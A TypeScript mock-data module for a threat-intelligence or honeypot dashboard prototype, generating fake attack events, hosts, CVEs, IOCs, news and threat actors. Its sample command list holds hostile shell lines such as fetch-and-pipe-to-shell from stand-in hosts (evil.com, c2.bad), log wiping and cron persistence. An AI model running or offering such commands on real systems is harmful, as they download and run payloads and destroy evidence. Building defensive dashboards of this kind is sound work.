// Mock data for static prototype demonstration

export interface MockThreatEvent {
  id: string;
  timestamp: string;
  srcIp: string;
  dstPort: number;
  honeypot: string;
  eventType: string;
  country: string;
  countryCode: string;
  severity: 'low' | 'medium' | 'high' | 'critical';
  command?: string;
  username?: string;
  asn?: string;
}

export interface MockHost {
  ip: string;
  country: string;
  countryCode: string;
  totalScore: number;
  riskLevel: 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL';
  eventCount: number;
  firstSeen: string;
  lastSeen: string;
  asn?: string;
  org?: string;
  ports: number[];
  signatures: string[];
  isBlacklisted: boolean;
}

export interface MockCve {
  id: string;
  description: string;
  severity: 'low' | 'medium' | 'high' | 'critical';
  cvss: number;
  published: string;
  vendor: string;
  product: string;
  exploitAvailable: boolean;
}

export interface MockIoc {
  id: string;
  type: 'ip' | 'domain' | 'hash' | 'url';
  value: string;
  source: string;
  severity: 'low' | 'medium' | 'high' | 'critical';
  firstSeen: string;
  lastSeen: string;
  tags: string[];
}

export interface MockNewsItem {
  id: string;
  title: string;
  source: string;
  published: string;
  category: string;
  url: string;
}

export interface MockActor {
  id: string;
  name: string;
  aliases: string[];
  country: string;
  motivation: string;
  firstSeen: string;
  lastSeen: string;
  ttps: string[];
  targets: string[];
}

// â”€â”€ Generators â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

const countries = [
  { name: 'China', code: 'CN' }, { name: 'Russia', code: 'RU' },
  { name: 'United States', code: 'US' }, { name: 'Germany', code: 'DE' },
  { name: 'Netherlands', code: 'NL' }, { name: 'Brazil', code: 'BR' },
  { name: 'India', code: 'IN' }, { name: 'Vietnam', code: 'VN' },
  { name: 'South Korea', code: 'KR' }, { name: 'Iran', code: 'IR' },
  { name: 'North Korea', code: 'KP' }, { name: 'Ukraine', code: 'UA' },
  { name: 'France', code: 'FR' }, { name: 'Japan', code: 'JP' },
];

const honeypots = ['cowrie', 'dionaea', 'conpot', 'elasticpot', 'mailoney', 'heralding'];
const eventTypes = ['LOGIN_ATTEMPT', 'COMMAND_EXECUTION', 'FILE_DOWNLOAD', 'PORT_SCAN', 'BRUTE_FORCE', 'EXPLOIT_ATTEMPT'];
const commands = [
  'cat /etc/passwd', 'wget http://evil.com/payload.sh', 'curl http://c2.bad/a.bin | sh',
  'uname -a', 'id', '/bin/busybox echo', 'cd /tmp; wget http://bot.net/miner',
  'python -c "import socket,subprocess,os"', 'nmap -sV 192.168.1.0/24',
  'rm -rf /var/log/*', 'cat /proc/cpuinfo', 'echo "*/5 * * * * /tmp/.x" >> /var/spool/cron/crontabs/root',
];
const usernames = ['root', 'admin', 'test', 'user', 'oracle', 'postgres', 'ubuntu', 'pi', 'guest', 'support'];
const signatures = [
  'Log4j RCE', 'Reverse Shell', 'Crypto-Miner', 'Web Shell', 'Cobalt Strike Beacon',
  'SSH Brute Force', 'SQL Injection', 'Directory Traversal', 'XSS Payload', 'SSRF Attempt',
];

function randomIp(): string {
  return `${Math.floor(Math.random() * 223) + 1}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`;
}

function randomFrom<T>(arr: T[]): T {
  return arr[Math.floor(Math.random() * arr.length)];
}

function randomDate(daysBack: number): string {
  const d = new Date();
  d.setDate(d.getDate() - Math.floor(Math.random() * daysBack));
  d.setHours(Math.floor(Math.random() * 24), Math.floor(Math.random() * 60));
  return d.toISOString();
}

export function generateMockEvents(count: number): MockThreatEvent[] {
  return Array.from({ length: count }, (_, i) => {
    const c = randomFrom(countries);
    return {
      id: `evt-${i}`,
      timestamp: randomDate(7),
      srcIp: randomIp(),
      dstPort: randomFrom([22, 23, 80, 443, 445, 2222, 3306, 3389, 5900, 8080, 8443]),
      honeypot: randomFrom(honeypots),
      eventType: randomFrom(eventTypes),
      country: c.name,
      countryCode: c.code,
      severity: randomFrom(['low', 'medium', 'high', 'critical'] as const),
      command: Math.random() > 0.4 ? randomFrom(commands) : undefined,
      username: Math.random() > 0.3 ? randomFrom(usernames) : undefined,
      asn: `AS${Math.floor(Math.random() * 60000) + 1000}`,
    };
  }).sort((a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime());
}

export function generateMockHosts(count: number): MockHost[] {
  return Array.from({ length: count }, (_, i) => {
    const c = randomFrom(countries);
    const score = Math.floor(Math.random() * 100);
    return {
      ip: randomIp(),
      country: c.name,
      countryCode: c.code,
      totalScore: score,
      riskLevel: score >= 80 ? 'CRITICAL' : score >= 60 ? 'HIGH' : score >= 30 ? 'MEDIUM' : 'LOW',
      eventCount: Math.floor(Math.random() * 500) + 1,
      firstSeen: randomDate(30),
      lastSeen: randomDate(2),
      asn: `AS${Math.floor(Math.random() * 60000) + 1000}`,
      org: randomFrom(['DigitalOcean', 'Amazon AWS', 'Hetzner', 'OVH', 'Alibaba Cloud', 'Tencent', 'Linode', 'Vultr']),
      ports: Array.from({ length: Math.floor(Math.random() * 5) + 1 }, () => randomFrom([22, 23, 80, 443, 445, 3389])),
      signatures: Array.from({ length: Math.floor(Math.random() * 3) }, () => randomFrom(signatures)),
      isBlacklisted: Math.random() > 0.6,
    };
  }).sort((a, b) => b.totalScore - a.totalScore);
}

export function generateMockCves(count: number): MockCve[] {
  const vendors = ['Apache', 'Microsoft', 'Google', 'Oracle', 'Linux', 'Cisco', 'VMware', 'Fortinet', 'Palo Alto', 'Adobe'];
  return Array.from({ length: count }, (_, i) => {
    const cvss = +(Math.random() * 10).toFixed(1);
    return {
      id: `CVE-2024-${String(i + 1000).padStart(5, '0')}`,
      description: randomFrom([
        'Remote code execution via deserialization vulnerability.',
        'Privilege escalation through improper access control.',
        'SQL injection in authentication endpoint.',
        'Buffer overflow in network stack.',
        'Cross-site scripting in admin panel.',
        'Authentication bypass via crafted token.',
        'Path traversal allowing arbitrary file read.',
        'Denial of service through malformed packet.',
      ]),
      severity: cvss >= 9 ? 'critical' : cvss >= 7 ? 'high' : cvss >= 4 ? 'medium' : 'low',
      cvss,
      published: randomDate(90),
      vendor: randomFrom(vendors),
      product: randomFrom(['Server', 'Firewall', 'Database', 'Framework', 'Runtime', 'SDK', 'API Gateway']),
      exploitAvailable: Math.random() > 0.7,
    };
  }).sort((a, b) => b.cvss - a.cvss);
}

export function generateMockIocs(count: number): MockIoc[] {
  const sources = ['abuse.ch', 'AlienVault OTX', 'ThreatFox', 'URLhaus', 'FeodoTracker', 'MalwareBazaar', 'IPsum', 'BlocklistDE'];
  return Array.from({ length: count }, (_, i) => {
    const type = randomFrom(['ip', 'domain', 'hash', 'url'] as const);
    let value = '';
    switch (type) {
      case 'ip': value = randomIp(); break;
      case 'domain': value = `${randomFrom(['evil', 'malware', 'c2', 'botnet', 'phish'])}.${randomFrom(['ru', 'cn', 'xyz', 'top', 'cc', 'tk'])}`;  break;
      case 'hash': value = Array.from({ length: 64 }, () => '0123456789abcdef'[Math.floor(Math.random() * 16)]).join(''); break;
      case 'url': value = `http://${randomIp()}:${randomFrom([8080, 443, 80])}/${randomFrom(['payload', 'bot', 'loader', 'dropper'])}.${randomFrom(['exe', 'sh', 'py', 'bin'])}`; break;
    }
    return {
      id: `ioc-${i}`,
      type,
      value,
      source: randomFrom(sources),
      severity: randomFrom(['low', 'medium', 'high', 'critical'] as const),
      firstSeen: randomDate(60),
      lastSeen: randomDate(5),
      tags: Array.from({ length: Math.floor(Math.random() * 3) + 1 }, () => randomFrom(['malware', 'botnet', 'c2', 'phishing', 'ransomware', 'trojan', 'apt', 'miner'])),
    };
  });
}

export function generateMockNews(count: number): MockNewsItem[] {
  const titles = [
    'Critical Zero-Day Vulnerability Found in Enterprise VPN Appliance',
    'New Ransomware Gang Targets Healthcare Sector with Double Extortion',
    'APT Group Deploys Novel Backdoor in Supply Chain Attack',
    'CISA Warns of Active Exploitation of Fortinet Vulnerability',
    'Major Botnet Disrupted in Coordinated International Operation',
    'Cloud Misconfiguration Exposes 500M Records',
    'New Phishing Kit Bypasses MFA Using Real-Time Proxying',
    'Critical Vulnerability in Apache Struts Under Active Exploitation',
    'State-Sponsored Actors Target Critical Infrastructure in Europe',
    'New Stealer Malware Sold on Dark Web Forums for $200/month',
    'Russian APT Group Exploits Microsoft Exchange Vulnerabilities',
    'FBI Seizes Infrastructure of Notorious Ransomware Group',
  ];
  const sources = ['BleepingComputer', 'The Hacker News', 'Krebs on Security', 'Dark Reading', 'SecurityWeek', 'The Record', 'CISA', 'Mandiant'];
  const categories = ['Vulnerability', 'Ransomware', 'APT', 'Malware', 'Data Breach', 'Advisory'];
  return Array.from({ length: count }, (_, i) => ({
    id: `news-${i}`,
    title: titles[i % titles.length],
    source: randomFrom(sources),
    date: randomDate(14),
    category: randomFrom(categories),
    url: '#',
  })).sort((a, b) => new Date(b.published).getTime() - new Date(a.published).getTime());
}

export function generateMockActors(count: number): MockActor[] {
  const actors = [
    { name: 'APT28', aliases: ['Fancy Bear', 'Sofacy'], country: 'Russia', motivation: 'Espionage' },
    { name: 'APT29', aliases: ['Cozy Bear', 'The Dukes'], country: 'Russia', motivation: 'Espionage' },
    { name: 'APT41', aliases: ['Double Dragon', 'Wicked Panda'], country: 'China', motivation: 'Espionage/Financial' },
    { name: 'Lazarus Group', aliases: ['Hidden Cobra', 'Zinc'], country: 'North Korea', motivation: 'Financial/Espionage' },
    { name: 'FIN7', aliases: ['Carbanak', 'Navigator'], country: 'Russia', motivation: 'Financial' },
    { name: 'Sandworm', aliases: ['Voodoo Bear', 'IRIDIUM'], country: 'Russia', motivation: 'Sabotage' },
    { name: 'Turla', aliases: ['Venomous Bear', 'Snake'], country: 'Russia', motivation: 'Espionage' },
    { name: 'Equation Group', aliases: ['EQGRP'], country: 'United States', motivation: 'Espionage' },
    { name: 'MuddyWater', aliases: ['Mercury', 'SeedWorm'], country: 'Iran', motivation: 'Espionage' },
    { name: 'Kimsuky', aliases: ['Velvet Chollima'], country: 'North Korea', motivation: 'Espionage' },
  ];
  return actors.slice(0, count).map((a, i) => ({
    id: `actor-${i}`,
    ...a,
    firstSeen: randomDate(365 * 5),
    lastSeen: randomDate(30),
    ttps: Array.from({ length: 5 }, () => `T${Math.floor(Math.random() * 1600) + 1}`),
    targets: Array.from({ length: 3 }, () => randomFrom(['Government', 'Defense', 'Finance', 'Energy', 'Healthcare', 'Technology', 'Telecom'])),
  }));
}

// Pre-generated datasets
export const MOCK_EVENTS = generateMockEvents(200);
export const MOCK_HOSTS = generateMockHosts(50);
export const MOCK_CVES = generateMockCves(30);
export const MOCK_IOCS = generateMockIocs(80);
export const MOCK_NEWS = generateMockNews(12);
export const MOCK_ACTORS = generateMockActors(10);

// Dashboard summary stats
export const MOCK_STATS = {
  totalEvents: 14_832,
  criticalThreats: 47,
  activeHoneypots: 6,
  uniqueAttackers: 2_341,
  blockedIps: 892,
  activeCases: 3,
  iocCount: MOCK_IOCS.length,
  cveCount: MOCK_CVES.length,
  countriesSource: 38,
  eventsToday: 1_247,
  eventsTrend: +12.4,
};

